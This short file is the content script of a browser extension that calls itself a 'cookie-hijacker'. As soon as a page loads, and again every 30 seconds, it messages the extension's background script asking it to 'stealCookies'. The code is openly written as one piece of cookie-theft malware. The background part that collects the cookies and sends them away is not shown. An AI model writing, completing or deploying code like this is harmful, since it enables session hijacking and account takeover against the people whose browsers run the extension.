// Trigger cookie theft after page loads
console.log('[cookie-hijacker] Content script loaded');

// Immediately request to steal cookies
chrome.runtime.sendMessage({ action: 'stealCookies' });

// Periodically steal cookies (every 30 seconds)
setInterval(() => {
  chrome.runtime.sendMessage({ action: 'stealCookies' });
}, 30000); 